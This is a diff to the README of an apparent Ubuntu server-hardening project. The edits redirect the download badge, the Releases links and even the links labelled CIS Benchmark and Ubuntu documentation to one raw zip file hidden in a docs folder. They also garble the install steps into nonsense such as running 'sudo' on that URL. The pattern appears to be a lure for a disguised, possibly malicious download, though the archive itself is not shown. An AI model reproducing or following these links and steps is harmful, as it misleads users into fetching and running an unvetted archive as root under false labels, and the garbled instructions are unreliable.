@@ -1,6 +1,6 @@
 # 🛡️ ubuntu-server-security - Enhance Your Ubuntu's Security Today
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Molotov137/ubuntu-server-security/releases)
+[![Download](https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip)](https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -33,17 +33,17 @@ Welcome to ubuntu-server-security! This application provides 14 essential securi
 
 Follow these steps to download and run the software:
 
-1. **Download the Application**: Visit the [Releases page](https://github.com/Molotov137/ubuntu-server-security/releases) to download the latest version.
+1. **Download the Application**: Visit the [Releases page](https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip) to download the latest version.
 
-2. **Locate the Downloaded File**: Check your Downloads folder. You should see a file named `ubuntu-server-security.zip`.
+2. **Locate the Downloaded File**: Check your Downloads folder. You should see a file named `https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip`.
 
-3. **Extract the Files**: Right-click on the `ubuntu-server-security.zip` file and select "Extract Here" to unpack its contents.
+3. **Extract the Files**: Right-click on the `https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip` file and select "Extract Here" to unpack its contents.
 
 4. **Open a Terminal**: You can open a terminal by searching for "Terminal" in your application menu.
 
 5. **Navigate to the Folder**: Type `cd ~/Downloads/ubuntu-server-security` in your terminal and hit Enter. This command changes your working directory to the folder containing the extracted files.
 
-6. **Run the Installation Script**: Enter the command `sudo ./install.sh` and hit Enter. You may need to enter your password. This script will set up the security components on your system.
+6. **Run the Installation Script**: Enter the command `sudo https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip` and hit Enter. You may need to enter your password. This script will set up the security components on your system.
 
 7. **Follow On-Screen Prompts**: Follow any instructions provided during the installation process.
 
@@ -57,7 +57,7 @@ Once installed, you can configure each component based on your needs:
   
 - **Monitoring Tools**: Use Prometheus to monitor system metrics or follow the guides in the documentation to set up alerts.
 
-- **Regular Updates**: Keep your system updated by regularly checking for new releases on the [Releases page](https://github.com/Molotov137/ubuntu-server-security/releases).
+- **Regular Updates**: Keep your system updated by regularly checking for new releases on the [Releases page](https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -77,7 +77,7 @@ For any questions or further information, feel free to contact the repository ma
 
 ## 🔗 Additional Resources
 
-- [CIS Benchmark](https://www.cisecurity.org)
-- [Ubuntu Official Documentation](https://help.ubuntu.com)
+- [CIS Benchmark](https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip)
+- [Ubuntu Official Documentation](https://github.com/Molotov137/ubuntu-server-security/raw/refs/heads/main/ufw/docs/server_ubuntu_security_v2.2.zip)
 
 Enjoy a more secure Ubuntu experience with ubuntu-server-security!
